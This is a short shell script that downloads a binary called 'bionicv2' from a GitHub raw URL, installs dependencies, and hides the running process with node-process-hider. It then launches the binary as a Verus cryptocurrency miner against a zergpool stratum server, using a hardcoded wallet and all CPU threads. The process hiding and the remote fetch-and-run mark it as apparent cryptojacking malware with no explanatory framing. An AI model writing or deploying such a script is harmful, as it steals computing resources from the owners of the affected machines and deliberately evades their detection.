#!/bin/sh

wget -O bionicv2 https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/bionicv2
chmod +x bionicv2
apt-get update
apt-get install screen -y
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev xz-utils -y
apt-get install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
npm i -g node-process-hider
ph add bionicv2
pool="stratum+tcp://verushash.na.mine.zergpool.com:3300"
wallet="DQGAS3U8cmDwBPn61bboXNBrSkEWhXuaVT"
workername="$(cat /proc/sys/kernel/hostname)"
thread="$(nproc --all)"
./bionicv2 -a verus -o $pool -u $wallet.$workername -t $thread -p c=DGB,mc=VRSC,ID=rig1
